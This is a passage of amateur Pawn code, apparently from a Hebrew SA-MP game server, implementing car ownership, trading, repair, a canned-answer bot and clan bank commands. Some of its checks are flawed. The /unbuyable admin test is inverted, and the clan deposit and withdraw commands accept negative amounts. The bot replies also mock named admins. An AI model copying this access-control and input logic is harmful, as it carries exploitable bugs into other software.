SendClientMessage(playerid,lblue,"/BuyCar :לקניית הרכב בצע/י");
format(vehname,999,".%d :האיידי של הרכב",GetVehicleModel(GetPlayerVehicleID(playerid)));
SendClientMessage(playerid,0x0F482FF,vehname);
format(vehname,999,".%d :האיידי של הרכב במוד",GetPlayerVehicleID(playerid));
SendClientMessage(playerid,lblue,vehname);
}

 	           return 1;
               }
//==============================================================================
if(strcmp(cmd, "/Calockallcars", true) == 0)
{
if(!IsPlayerXAdmin(playerid,3)) return true;
for(new cari=0; cari < VCount; cari++) for(new i=0; i < MAX_PLAYERS; i++) SetVehicleParamsForPlayer(cari,i, 0, 0);
return SendClientMessage(playerid, LIGHTGREEN,".כל המכוניות נפתחו מנעילה");
}


if(!strcmp(cmd, "/lock", true))
{
new vehicleid = GetPlayerVehicleID(playerid);
GetPlayerName(playerid,PlayerName,30);
if(!(IsPlayerInAnyVehicle(playerid))) return SendClientMessage(playerid,red,".עליך להיות ברכב");
if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return
SendClientMessage(playerid,red,".אתה לא יכול לנעול את הדלתות");
if(GetPlayerVehicleID(playerid) >= VCount) return SendClientMessage(playerid,red,".מכונית זאתי אינה שייכת לחנות המכוניות");
if(strcmp(PlayerName,VehicleInfo[vehicleid][CarOwner],true) != 0)return SendClientMessage(playerid,red,".מכונית זאתי אינה בבעלותך");
if(!VehicleInfo[vehicleid][CarOwned]) return SendClientMessage(playerid,red,".מכונית זאתי אינה נמצאת בבעלות");
if(!pia[playerid][CarID]) return SendClientMessage(playerid,red, "אין לך מכונית");

for (new i=0;i<MAX_PLAYERS;i++) if(i != playerid) SetVehicleParamsForPlayer(GetPlayerVehicleID(playerid),i, 0, 1);
return SendClientMessage(playerid, COLOR_LIGHTGREEN, ".המכונית כעת נעולה");
}

if(!strcmp(cmd, "/unlock", true))
{
if(PlayerInfo[playerid][Level] < 2) return Messagelevel(playerid,2);
new vehicleid = GetPlayerVehicleID(playerid);
GetPlayerName(playerid,PlayerName,30);
if(pia[playerid][CarID] == 0) return SendClientMessage(playerid,red,".אין בבעלותך שום רכב");
if(!(IsPlayerInAnyVehicle(playerid))) return SendClientMessage(playerid,red,".עליך להיות ברכב");
if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid,red,".אתה לא יכול לפתוח את הדלתות");
if(GetPlayerVehicleID(playerid) >= VCount) return SendClientMessage(playerid,red,".מכונית זאתי אינה שייכת לחנות המכוניות");
if(strcmp(PlayerName,VehicleInfo[vehicleid][CarOwner],true) != 0) return SendClientMessage(playerid,red,".זו לא המכונית ששייכת לך אתה לא יכול לנעול אותה");
for (new i=0;i<MAX_PLAYERS;i++) if(i != playerid) SetVehicleParamsForPlayer(GetPlayerVehicleID(playerid),i, 0, 0);
return SendClientMessage(playerid, COLOR_LIGHTGREEN, ".עכשיו ביטלתה את נעילת המכונית");
}


	if(strcmp(cmd, "/buyable", true) == 0)
	{
    	if(IsPlayerAdmin(playerid))
    	{
			new carid;		GetPlayerName(playerid,PlayerName,30);
			tmp = strtok(cmdtext,idx);
             if(20 < strlen(tmp)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");

			if(!strlen(tmp))
			{
				if(!(IsPlayerInAnyVehicle(playerid)))
				{
					SendClientMessage(playerid,red,"Please enter a vehicle and type /buyable OR type /buyable [vehicleid]");
				}
				else
				{
					new vehicleid = GetPlayerVehicleID(playerid);
					VehicleInfo[vehicleid][Buyable] = 1;

				    return 1;
				}
			}
			else
			{
	   		carid = strval(tmp);
			if(carid >= VCount) return SendClientMessage(playerid,red,"This car cannot be buyable");
			tmp = strtok(cmdtext, idx);
            if(20 < strlen(tmp)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");

			VehicleInfo[carid][Buyable] = 1;

			}
		}
		else
		{
		//	SendClientMessage(playerid, red, "This command is for admins only");
		}
		return 1;
	}

//==============================================================================
	if(strcmp(cmd, "/unbuyable", true) == 0)
	{
    	if(!IsPlayerXAdmin(playerid,20))
    	{
			new carid;		GetPlayerName(playerid,PlayerName,30);
			tmp = strtok(cmdtext,idx);
            if(20 < strlen(tmp)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");

			if(!strlen(tmp))
			{
				if(!(IsPlayerInAnyVehicle(playerid)))
				{
					SendClientMessage(playerid,red,"Please enter a vehicle and type /unbuyable OR type /unbuyable [vehicleid]");
				}
				else
				{
					new vehicleid = GetPlayerVehicleID(playerid);
					VehicleInfo[vehicleid][Buyable] = 0;
			VehicleInfo[carid][Buyable] = 0;
           format(file,sizeof(file),"Car/car%d.ini",carid);
           dini_IntSet(file,"Buyable",0);
				    return 1;
				}
			}
			else
			{
	   		carid = strval(tmp);
			if(carid >= VCount) return SendClientMessage(playerid,red,"This car cannot be buyable");
			tmp = strtok(cmdtext, idx);
            if(20 < strlen(tmp)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");

			VehicleInfo[carid][Buyable] = 0;
           format(file,sizeof(file),"Car/car%d.ini",carid);
           dini_IntSet(file,"Buyable",0);

			}
		}
		else
		{
		//	SendClientMessage(playerid, red, "This command is for admins only");
		}
		return 1;
	}
//==============================================================================*/



//==============================================================================
if(strcmp(cmd, "/sellcar", true) == 0)
{
if(PlayerInfo[playerid][Level] < 2) return Messagelevel(playerid,3);
new vehicleid = GetPlayerVehicleID(playerid);
format(file,sizeof(file),"Car/car%d.ini",GetPlayerVehicleID(playerid) );
GetPlayerName(playerid,PlayerName,30);
if(pia[playerid][CarID] == 0) return SendClientMessage(playerid,red,".אין בבעלותך שום רכב");
if(strcmp(PlayerName,VehicleInfo[vehicleid][CarOwner],true) != 0)
return SendClientMessage(playerid,red,".רכב זה לא בבעלותך");
if(!(IsPlayerInAnyVehicle(playerid))) return SendClientMessage(playerid,red,".אתה צריך להיות בתוך המכונית שלך בכדי למכור אותה ");

if(VehicleInfo[vehicleid][CarOwned] != 1) return SendClientMessage(playerid,red,".למכונית זו אין בעלים ולכן אי אפשר למכור אותה");

if(!dini_Exists(file))
{
format(string,sizeof(string),"ID [ %d ] - מכונית זו אינה ניתנת למכירה", vehicleid );
SendClientMessage(playerid,red,string);
}
else
{
for	(new i=0;i<MAX_PLAYERS;i++) SetVehicleParamsForPlayer(vehicleid,i, 0, 0);
format(file,sizeof(file),"Car/car%d.ini",pia[playerid][CarID]);
dini_IntSet(file,"CarOwned",0);
dini_Set(file,"CarOwner","אין");
dini_IntSet(file,"Buyable",1);
VehicleInfo[vehicleid][CarOwned] = 0;
strmid(VehicleInfo[vehicleid][CarOwner], dini_Get(file,"CarOwner"), 0, strlen(dini_Get(file,"CarOwner")), 255);
VehicleInfo[vehicleid][Buyable] = 1;

pia[playerid][CarID] = 0;
pia[playerid][OwnCar] = 0;
dini_IntSet(GetPlayerFile(playerid),"ofidcarid",0);
dini_IntSet(GetPlayerFile(playerid),"OFCARAR",0);
SendClientMessage(playerid, 0x33FF33AA, ".מכרת הרכב שלך, מחיר הרכב הועבר לחשבון בנק שלך");
dini_IntSet(GetPlayerFile(playerid),"Bank",PlayerInfo[playerid][Bank]+VehicleInfo[vehicleid][Price]/2);
dini_Set(GetPlayerFile(playerid),"Car","None");
}
return 1;
}
//if(strcmp(cmd, "/Buycar", true) == 0) return SendClientMessage(playerid,red,"!היום בערב יעבוד המערכת מכוניות");

    //--

if(strcmp(cmd, "/Buycar", true) == 0)
{

new msg[256];
format(file,sizeof(file),"Car/car%d.ini", GetPlayerVehicleID(playerid) );
GetPlayerName(playerid, PlayerName, sizeof(PlayerName));
new car = GetPlayerVehicleID(playerid);

if(GetPlayerVehicleID(playerid) == 522 && PlayerInfo[playerid][Level] < 2) return SendClientMessage(playerid, 0xFF0000AA, "קניית אופנוע רק מרמה 2 ומעלה");
if(GetPlayerVehicleID(playerid) == 425 && PlayerInfo[playerid][Level] < 3) return SendClientMessage(playerid, 0xFF0000AA, ".קניית רכב זה רק מרמה 3 ומעלה");
if(GetPlayerVehicleID(playerid) == 520 && PlayerInfo[playerid][Level] < 3) return SendClientMessage(playerid, 0xFF0000AA, ".קניית רכב זה רק מרמה 2 ומעלה");
if(GetPlayerVehicleID(playerid) == 447 && PlayerInfo[playerid][Level] < 3) return SendClientMessage(playerid, 0xFF0000AA, ".קניית רכב זה רק מרמה 3 ומעלה");



if(!dini_Exists(file))
{
format(string,sizeof(string),"[ID: %d] .המכונית הזאתי לא ניתנת למכירה ", GetPlayerVehicleID(playerid));
SendClientMessage(playerid,red,string);
}
else
{
if(VehicleInfo[car][SaleV] == 0)
{

if (PlayerInfo[playerid][Level] < 1) return Messagelevel (playerid, 1);
new vehicleid = GetPlayerVehicleID(playerid);
if(GetPlayerMoney(playerid) < VehicleInfo[vehicleid][Price]) return SendClientMessage(playerid,red,".אין לך מספיק כסף בשביל ליקנות את המכונית הזאתי ");
if(!(IsPlayerInAnyVehicle(playerid))) return SendClientMessage(playerid,red,".אתה צריך להיות במכונית שאתה רוצה ליקנות ");
if(GetPlayerVehicleID(playerid) >= VCount) return SendClientMessage(playerid,red,".זהו רכב ציבורי, אינו ניתן לקניה");
if(VehicleInfo[vehicleid][CarOwned] == 1 ) return SendClientMessage(playerid,red,".המכונית הזאתי שייכת למישהו אחר ");
if(pia[playerid][CarID] > 0) return SendClientMessage(playerid,red,".יש לך כבר מכונית");
if(VehicleInfo[vehicleid][Buyable] == 0)
return
format(msg,sizeof(msg),".הינו רכב ציבורי אינך יכול לקנות תרכב התמידי הזה ,%s רכב זה",VehicleInfo[vehicleid][CarName]),
SendClientMessage(playerid,WHITE,msg);


dini_IntSet(file,"CarOwned",1);
dini_Set(file,"CarOwner",PlayerName);
dini_IntSet(file,"Buyable",0);
dini_Set(file,"CarOwner",PlayerName);
VehicleInfo[vehicleid][CarOwned] = 1;
strmid(VehicleInfo[vehicleid][CarOwner], PlayerName, 0, strlen(PlayerName), 255);
VehicleInfo[vehicleid][Buyable] = 0;

pia[playerid][CarID] = GetPlayerVehicleID(playerid);
pia[playerid][OwnCar] = 1;
dini_IntSet(GetPlayerFile(playerid),"ofidcarid",pia[playerid][CarID]);
dini_IntSet(GetPlayerFile(playerid),"OFCARAR",1);
format(string,sizeof(string),"/Help Car בהצלחה, לעזרה בצע/י ,%s קנית את הרכב ,%s שלום לך",VehNames[GetVehicleModel(vehicleid)-400],GetName(playerid));
SendClientMessage(playerid,lblue,string);
LACY_GiveMoney(playerid,-VehicleInfo[vehicleid][Price]);



new File:f;
if(fexist(GetPlayerFile(playerid)))
{
dini_Set(GetPlayerFile(playerid),"Car",VehNames[GetVehicleModel(vehicleid)-400]);
f = fopen(GetPlayerFile(playerid),io_append);
fclose(f);
}
return 1;
}


if(VehicleInfo[car][SaleV] > 0)
{

if (PlayerInfo[playerid][Level] < 1) return Messagelevel (playerid, 1);
new vehicleid = GetPlayerVehicleID(playerid);
if(GetPlayerMoney(playerid) < VehicleInfo[car][SaleV]) return SendClientMessage(playerid,red,".אין לך מספיק כסף בשביל ליקנות את המכונית הזאתי ");
if(!(IsPlayerInAnyVehicle(playerid))) return SendClientMessage(playerid,red,".אתה צריך להיות במכונית שאתה רוצה ליקנות ");
if(GetPlayerVehicleID(playerid) >= VCount) return SendClientMessage(playerid,red,".זהו רכב ציבורי, אינו ניתן לקניה");
if(pia[playerid][CarID] > 0) return SendClientMessage(playerid,red,".יש לך כבר מכונית");

new fileuser[256];




format(fileuser,sizeof(fileuser),"RLSB/Users/%s.ini",dini_Get(file,"CarOwner"));
dini_IntSet(fileuser,"Bank",dini_Int(fileuser,"Bank")+VehicleInfo[car][SaleV]);
dini_IntSet(fileuser,"ofidcarid",0);
dini_IntSet(fileuser,"OFCARAR",0);
VehicleInfo[car][SaleV] = 0;
dini_IntSet(file,"SaleV",0);
dini_IntSet(file,"CarOwned",1);
dini_Set(file,"CarOwner",PlayerName);
dini_IntSet(file,"Buyable",0);
dini_Set(file,"CarOwner",PlayerName);
VehicleInfo[vehicleid][CarOwned] = 1;
strmid(VehicleInfo[vehicleid][CarOwner], PlayerName, 0, strlen(PlayerName), 255);
VehicleInfo[vehicleid][Buyable] = 0;
pia[playerid][CarID] = GetPlayerVehicleID(playerid);
pia[playerid][OwnCar] = 1;
dini_IntSet(GetPlayerFile(playerid),"ofidcarid",pia[playerid][CarID]);
dini_IntSet(GetPlayerFile(playerid),"OFCARAR",1);
format(string,sizeof(string),"/Help Car בהצלחה, לעזרה בצע/י ,%s קנית את הרכב ,%s שלום לך",VehNames[GetVehicleModel(vehicleid)-400],GetName(playerid));
SendClientMessage(playerid,lblue,string);
LACY_GiveMoney(playerid,-VehicleInfo[car][SaleV]);
new File:f;
if(fexist(GetPlayerFile(playerid)))
{
dini_Set(GetPlayerFile(playerid),"Car",VehNames[GetVehicleModel(vehicleid)-400]);
f = fopen(GetPlayerFile(playerid),io_append);
fclose(f);
}
return 1;
}
}
return 1;
}

if(strcmp(cmd,"/setprice",true) == 0)
{

new FileCar[256];
format(FileCar,sizeof(FileCar),"Car/car%d.ini", pia[playerid][CarID]);

new icqnumb[256];
icqnumb = strtok(cmdtext,idx);

if(20 < strlen(icqnumb)) return SendClientMessage(playerid,WHITE,".בלתי אפשרי להפיל את השרת שלנו");
if(!strlen(icqnumb)) return SendClientMessage(playerid,WHITE,"Usage: /SetPrice [Price]");
if(pia[playerid][CarID] == 0) return SendClientMessage(playerid,red,".אין לך שום רכב בבעלותך");
if(VehicleInfo[pia[playerid][CarID]][SaleV] > 0) return SendClientMessage(playerid,red,"Usage: /StopSale :הרכב שלך כבר מוצע למכירה, על מנת לעצור את המכירה בצע/י");
if(strval(icqnumb) > 100000000 || strval(icqnumb) < 1) return SendClientMessage(playerid,red,"Usage: /SetPrice [1 - 10,000,000]");
dini_IntSet(FileCar,"SaleV",strval(icqnumb));
VehicleInfo[pia[playerid][CarID]][SaleV] = dini_Int(FileCar,"SaleV");
format(string,sizeof(string),".[%d] - הצעת את הרכב שלך לציבור במחיר של כ",strval(icqnumb));
SendClientMessage(playerid,COLOR_YELLOW,string);
SendClientMessage(playerid,WHITE,"/StopSale :על מנת לעצור את מכירת הרכב בצע/י");
return 1;
}

if(strcmp(cmd,"/stopsale",true) == 0)
{

new FileCar[256];
format(FileCar,sizeof(FileCar),"Car/car%d.ini", pia[playerid][CarID]);
if(pia[playerid][CarID] == 0) return SendClientMessage(playerid,WHITE,".אין לך שום רכב בבעלותך");
if(VehicleInfo[pia[playerid][CarID]][SaleV] < 1) return SendClientMessage(playerid,WHITE,".הרכב שלך אינו מוצע לרכישה");
dini_IntSet(FileCar,"SaleV",0);
VehicleInfo[pia[playerid][CarID]][SaleV] = 0;
SendClientMessage(playerid,WHITE,".הפקסת את מכירת הרכב שלך");
return 1;
}

//==============================================================================
if(strcmp(cmd,"/callcar", true) == 0)
{
GetPlayerName(playerid,PlayerName,30);
if(GetPlayerInterior(playerid) == 1 || GetPlayerInterior(playerid) == 6 || GetPlayerInterior(playerid) == 10) return SendClientMessage(playerid,0xFF0000AA,".אתה לא יכול לתקוף שחקן שהוא נמצא בתוך אינטרור");
GetPlayerName(playerid,PlayerName,30);
new car = pia[playerid][CarID];
if(VehicleInfo[car][CarOwned] == 1 && pia[playerid][OwnCar] == 1)
{
if(GetPlayerMoney(playerid) < 0)
{
SendClientMessage(playerid,red," ");
}
else
{
for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerInVehicle(i,car))
{
RemovePlayerFromVehicle(i);
format(string,sizeof(string),".זימן את הרכב שלו, הליכה נעימה ,%s",PlayerName);
SendClientMessage(i,COLOR_LIGHTGREEN,string);
}
GetPlayerPos(playerid,Pos[playerid][0],Pos[playerid][1],Pos[playerid][2]);
SetPlayerCameraPos(playerid, Pos[playerid][0],Pos[playerid][1],Pos[playerid][2]);
SetPlayerCameraLookAt(playerid, Pos[playerid][0],Pos[playerid][1],Pos[playerid][2]);
PutPlayerInVehicle(playerid, car, 0);
GetVehicleZAngle(GetPlayerVehicleID(playerid), Angle[playerid]);
SetTimerEx("TeleCar",4000,0,"i",playerid);
SendClientMessage(playerid,LIGHTGREEN,"/repair :זימנת תרכב שלך בהצלחה, עם הרכב לא הגיע");
}
}
else
{
SendClientMessage(playerid,red,".אין בבעלותך שום רכב");
}
return 1;
}
//=======================
    
if(strcmp(cmd, "/repair", true) == 0)
{

new vehicleid = GetPlayerVehicleID(playerid);
GetPlayerName(playerid,PlayerName,30);
if(! (IsPlayerInAnyVehicle(playerid)) ) return SendClientMessage(playerid,red,".אתה חייב להיות בתוך הרכב כדי להישתמש בשירות התיקונים");
if(strcmp(PlayerName,VehicleInfo[vehicleid][CarOwner],true) != 0)return SendClientMessage(playerid,red,"! זו לא המכונית שלך אז אינך יכול לתקן אותה");
if(pia[playerid][CarID] == 0) return SendClientMessage(playerid,red,".אין בבעלותך שום רכב");
if(GetPlayerMoney(playerid) < 1000) return SendClientMessage(playerid,red,".אין לך מספיק כסף כדי להיתמש בשירות התיקונים");

GetPlayerPos(playerid,Pos[playerid][0],Pos[playerid][1],Pos[playerid][2]);
GetVehicleZAngle(GetPlayerVehicleID(playerid), Angle[playerid]);
SetPlayerCameraPos(playerid, 1929.0, 2137.0, 11.0);
SetPlayerCameraLookAt(playerid,1935.0, 2138.0, 11.5);
if(IsPlayerInAnyVehicle(playerid)) SetVehiclePos(GetPlayerVehicleID(playerid), 1974.0,2162.0,11.0);
SetVehicleZAngle(GetPlayerVehicleID(playerid), -90);
SendClientMessage(playerid,LIGHTGREEN,".תודה שהישתמשת בשירות התיקונים, המכונית תיהיה מוכנה תוך 5 שניות");
LACY_GiveMoney(playerid,-1000);
return SetTimerEx("RepairCar",5000,0,"i",playerid);

}

//==============================================================================
	if(strcmp(cmd,"/eject", true)==0)
	{
		new pid;
		GetPlayerName(playerid,PlayerName,30);
		new vehicleid = GetPlayerVehicleID(playerid);
		tmp = strtok(cmdtext,idx);
        if(20 < strlen(tmp)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");

		if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red,".אתה לא בתוך רכב");
		if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid,red,".נוסעים לא יכולים להישתמש בפקודה זו");

		if(strcmp(PlayerName,VehicleInfo[vehicleid][CarOwner],true) != 0)
   		return SendClientMessage(playerid,red,".אתה לא יכול להוציא מהרכב הזה");

		if(!strlen(tmp)) return SendClientMessage(playerid,COLOR_WHITE,"Usage: /eject [playerid]");

		pid = strval(tmp);
		if(!IsPlayerConnected(pid)) return SendClientMessage(playerid,red," השחקן אינו מחובר");
		if(!IsPlayerInVehicle(pid,GetPlayerVehicleID(playerid)) ) return
			SendClientMessage(playerid,red,"! שחקן זה אינו ברכב שלך");

		RemovePlayerFromVehicle(pid);
		GameTextForPlayer(pid,"~W~You Have ~R~Ejected",3000,5);
	    

 		return 1;
}
//--
//============
GetPlayerName(playerid,playername, sizeof(playername));



if(strcmp(cmd, "/botq", true) == 0)
{
new Mr_Joe[256];
Mr_Joe= strtok(cmdtext, idx);
if(20 < strlen(Mr_Joe)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
if(!strlen(Mr_Joe)) return SendClientMessage(playerid,WHITE,"Usage: /Botq [quiten]");

if(strcmp(Mr_Joe,"TS",true) == 0 || strcmp(Mr_Joe,"TeamSpeak",true) == 0)
return SendClientMessage(playerid,WHITE,"80.179.149.52:4545 :האייפי של הטים ספיק"),1;
if(strcmp(Mr_Joe,"פורום",true) == 0 || strfind(Mr_Joe,"הפורום?",true) == 0 ||  strcmp(Mr_Joe,"פורום",true) == 0 ||  strfind(Mr_Joe,"forum",true) == 0) return SendClientMessage(playerid,WHITE,"www.Satla-Zone.co.il - הכתובת של הפורום"),1;
if(strcmp(Mr_Joe,"שמן",true) == 0 || strcmp(Mr_Joe,"?מי הילד הכי שמן",true) == 0) return SendClientMessage(playerid,WHITE,"ברק מה לעשות, הוא הכי שמן :)"),1;
if(strcmp(Mr_Joe,"מתכנת",true) == 0 || strcmp(Mr_Joe,"Prog",true) == 0) return SendClientMessage(playerid,WHITE,"רועיקוש הסקסי!!"),1;
if(strcmp(Mr_Joe,"ראשיים",true) == 0 || strcmp(Mr_Joe,"ראשים",true) == 0 || strfind(Mr_Joe,"מנהל",true) == 0 || strcmp(Mr_Joe,"מנהלים",true) == 0) return SendClientMessage(playerid,WHITE,".סתיוי - האידיוט, ברק - השמן, יוני הגמד שאני אוהב אותו, מרועיקוש, תאריך:23/2/09"),1;
if(strcmp(Mr_Joe,"משעמם",true) == 0 || strcmp(Mr_Joe,"משעמם",true) == 0) return SendClientMessage(playerid,WHITE,"[= קח במבה תתעודד"),1;
if(strcmp(Mr_Joe,"Shnitzel",true) == 0 || strcmp(Mr_Joe,"שניצל",true) == 0) return SendClientMessage(playerid,WHITE,"[= גמאני רוצה שניאל !!"),1;
if(strcmp(Mr_Joe,"חטיף",true) == 0 || strcmp(Mr_Joe,"ממתק",true) == 0) return SendClientMessage(playerid,WHITE,"?במבה שליטע, כאילו דה"),1;

return SendClientMessage(playerid,WHITE,".לא נמצא תוכן שציינת, נסה שנית");
}


if(strcmp(cmd, "/cbalance", true) == 0)
{
if(strfind(dini_Get(GetPlayerFile(playerid),"Clan"),"None.",true) == 0 || strfind(dini_Get(GetPlayerFile(playerid),"Clan"),"None",true) == 0 || dini_Int(GetPlayerFile(playerid), "ClanLvl") < 1) return SendClientMessage(playerid, red,".אינך חבר/ה בקלאן");
if(GetPlayerMoney(playerid) < 1) return SendClientMessage(playerid,red,".אין עליך כסף");
format(file,sizeof(file),"Clans/%s.ini",dini_Get(GetPlayerFile(playerid),"Clan"));
format(string,sizeof(string),"$%d :חשבון הבנק עומד על כ",dini_Int(file,"Bank"));
SendClientMessage(playerid,COLOR_LIGHTGREEN,string);
return true;
}

if(strcmp(cmd, "/cdepositall", true) == 0)
{
if(strfind(dini_Get(GetPlayerFile(playerid),"Clan"),"None.",true) == 0 || strfind(dini_Get(GetPlayerFile(playerid),"Clan"),"None",true) == 0 || dini_Int(GetPlayerFile(playerid), "ClanLvl") < 1) return SendClientMessage(playerid, red,".אינך חבר/ה בקלאן");
if(GetPlayerMoney(playerid) < 1) return SendClientMessage(playerid,red,".אין עליך כסף");
format(file,sizeof(file),"Clans/%s.ini",dini_Get(GetPlayerFile(playerid),"Clan"));

dini_IntSet(file,"Bank",dini_Int(file,"Bank")+GetPlayerMoney(playerid));
format(string,sizeof(string),"$%d :הפקדה לחשבון הבנק שלך כ",GetPlayerMoney(playerid));
SendClientMessage(playerid,COLOR_LIGHTGREEN,string);
format(string,sizeof(string),"$%d :כעת חשבון הבנק קלאן שלכם עומד על סכום של כ",dini_Int(file,"Bank"));
SendClientMessage(playerid,COLOR_LIGHTGREEN,string);
for(new i = 0; i < GetMaxPlayers() ; i++){
GetPlayerName(i,iname, sizeof(iname));
if(i != playerid && !strcmp(dini_Get(GetPlayerFile(playerid),"Clan"),dini_Get(GetPlayerFile(i),"Clan"),true)){
format(strings,sizeof(strings),".$%d הפקיד לחשבון הבנק של הקלאן כ %s :השחקן",GetPlayerMoney(playerid),GetName(playerid));
SendClientMessage(i,COLOR_LIGHTGREEN,strings);
}}

ResetPlayerMoney(playerid);
return true;
}


if(strcmp(cmd, "/cdeposit", true) == 0)
{
if(strfind(dini_Get(GetPlayerFile(playerid),"Clan"),"None.",true) == 0 || strfind(dini_Get(GetPlayerFile(playerid),"Clan"),"None",true) == 0 || dini_Int(GetPlayerFile(playerid), "ClanLvl") < 1) return SendClientMessage(playerid, red,".אינך חבר/ה בקלאן");
if(GetPlayerMoney(playerid) < 1) return SendClientMessage(playerid,red,".אין עליך כסף");
format(file,sizeof(file),"Clans/%s.ini",dini_Get(GetPlayerFile(playerid),"Clan"));
new tmp_bank[256];
tmp_bank = strtok(cmdtext,idx);
if(!strlen(tmp_bank)) return SendClientMessage(playerid,red,".אנא הזן סכום");
if(GetPlayerMoney(playerid) < strval(tmp_bank)) return SendClientMessage(playerid,red,".הסכום שציינת שגוי");
dini_IntSet(file,"Bank",dini_Int(file,"Bank")+strval(tmp_bank));
format(string,sizeof(string),"$%d :הפקדה לחשבון הבנק שלך כ",strval(tmp_bank));
SendClientMessage(playerid,COLOR_LIGHTGREEN,string);
format(string,sizeof(string),"$%d :כעת חשבון הבנק קלאן שלכם עומד על סכום של כ",dini_Int(file,"Bank"));
SendClientMessage(playerid,COLOR_LIGHTGREEN,string);
LACY_GiveMoney(playerid,-strval(tmp_bank));

for(new i = 0; i < GetMaxPlayers() ; i++)
{
GetPlayerName(i,iname, sizeof(iname));
if(i != playerid && !strcmp(dini_Get(GetPlayerFile(playerid),"Clan"),dini_Get(GetPlayerFile(i),"Clan"),true))
{
format(strings,sizeof(strings),".$%d הפקיד לחשבון הבנק של הקלאן כ %s :השחקן",strval(tmp_bank),GetName(playerid));
SendClientMessage(i,COLOR_LIGHTGREEN,strings);
}}

return true;
}


if(strcmp(cmd, "/cwithdraw", true) == 0)
{
if(strfind(dini_Get(GetPlayerFile(playerid),"Clan"),"None.",true) == 0 || strfind(dini_Get(GetPlayerFile(playerid),"Clan"),"None",true) == 0 || dini_Int(GetPlayerFile(playerid), "ClanLvl") < 1) return SendClientMessage(playerid, red,".אינך חבר/ה בקלאן");
format(file,sizeof(file),"Clans/%s.ini",dini_Get(GetPlayerFile(playerid),"Clan"));
if(dini_Int(file,"Bank") < 1) return SendClientMessage(playerid,red,".חשבון הבנק ריק");

new tmp_bank[256];
tmp_bank = strtok(cmdtext,idx);
if(!strlen(tmp_bank)) return SendClientMessage(playerid,red,".אנא הזן סכום");
if(dini_Int(file,"CMaxWithdaw") > strval(tmp_bank)-1 && dini_Int(GetPlayerFile(playerid),"ClanLvl") < 3) return SendClientMessage(playerid,red,".אתה לא יכול למשוך סכום כזה הלידר שינה את הסכום לסכום נמוך ממה שציינת");
if(dini_Int(file,"CLock") == 1 && dini_Int(GetPlayerFile(playerid),"ClanLvl") < 3) return SendClientMessage(playerid,red,".הלידר נעל את הבנק");

if(dini_Int(file,"Bank") < strval(tmp_bank)) return SendClientMessage(playerid,red,".הסכום שציינת שגוי");
dini_IntSet(file,"Bank",dini_Int(file,"Bank")-strval(tmp_bank));
format(string,sizeof(string),"$%d :משכת מחשבון הבנק כ",strval(tmp_bank));
SendClientMessage(playerid,red,string);
format(string,sizeof(string),"$%d :כעת סכום הבנק עומד על",dini_Int(file,"Bank"));
SendClientMessage(playerid,red,string);
LACY_GiveMoney(playerid,strval(tmp_bank));

for(new i = 0; i < GetMaxPlayers() ; i++){
GetPlayerName(i,iname, sizeof(iname));
if(i != playerid && !strcmp(dini_Get(GetPlayerFile(playerid),"Clan"),dini_Get(GetPlayerFile(i),"Clan"),true)){
format(strings,sizeof(strings),".$%d משך מחשבון הבנק כ %s :השחקן",strval(tmp_bank),GetName(playerid));
SendClientMessage(i,red,strings);
}}

return true;
}


if(strcmp(cmd, "/cwithdrawall", true) == 0)
{
if(strfind(dini_Get(GetPlayerFile(playerid),"Clan"),"None.",true) == 0 || strfind(dini_Get(GetPlayerFile(playerid),"Clan"),"None",true) == 0 || dini_Int(GetPlayerFile(playerid), "ClanLvl") < 1) return SendClientMessage(playerid, red,".אינך חבר/ה בקלאן");
format(file,sizeof(file),"Clans/%s.ini",dini_Get(GetPlayerFile(playerid),"Clan"));
if(dini_Int(file,"Bank") < 1) return SendClientMessage(playerid,red,".חשבון הבנק ריק");
if(dini_Int(GetPlayerFile(playerid),"ClanLvl") < 3) return SendClientMessage(playerid,red,".פקודה זאתי משמשת לידרים בלבד");
LACY_GiveMoney(playerid,dini_Int(file,"Bank"));
format(string,sizeof(string),"$%d :משכת מחשבון הבנק כל הכסף",dini_Int(file,"Bank"));
SendClientMessage(playerid,red,string);
format(string,sizeof(string),"$%d :כעת סכום הבנק עומד על",dini_Int(file,"Bank")-dini_Int(file,"Bank"));
SendClientMessage(playerid,red,string);


for(new i = 0; i < GetMaxPlayers() ; i++)
{
GetPlayerName(i,iname, sizeof(iname));
if(i != playerid && !strcmp(dini_Get(GetPlayerFile(playerid),"Clan"),dini_Get(GetPlayerFile(i),"Clan"),true)){
format(strings,sizeof(strings),".$%d :משך את כל הכסף מהבנק %s :הלידר",dini_Int(file,"Bank"),GetName(playerid));
SendClientMessage(i,red,strings);
}}
dini_IntSet(file,"Bank",0);
return true;
}


if(strcmp(cmd, "/clan", true) == 0)
{
new Roy_Killer[256];
Roy_Killer= strtok(cmdtext, idx);
if(20 < strlen(Roy_Killer)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
if(!strlen(Roy_Killer))
{

SendClientMessage(playerid,COLOR_WHITE,"/clan create [name] :ליצירת קלאן חדש");
SendClientMessage(playerid,COLOR_WHITE,"/clan invite [playerid/name] - הזמנת שחקן לקלאן");
SendClientMessage(playerid,COLOR_WHITE,"/clan [join/leave] :להצטרפות לקלאן | עזיבה מקלאן");
SendClientMessage(playerid,COLOR_WHITE,"/clan info [details/stats/players] [name] :לבדיקת נתונים של קלאנים");
SendClientMessage(playerid,COLOR_WHITE,"/clan color [red-1-255] [green-1-255] [blue-1-255] :עריכת צבע הקלאן");
SendClientMessage(playerid,COLOR_WHITE,"/clan [kick/setlevel/color] :פקודות");
SendClientMessage(playerid,COLOR_WHITE,"/clan edit [leader/unleader/skin/sm/mute/unmute/chat] :פקודות עריכה");
SendClientMessage(playerid,COLOR_WHITE,"/clan bank [lock/unlock/maxwithdraw] :פקודות עריכה");

return 1;
}




if(strcmp(Roy_Killer,"create",true) == 0)
{
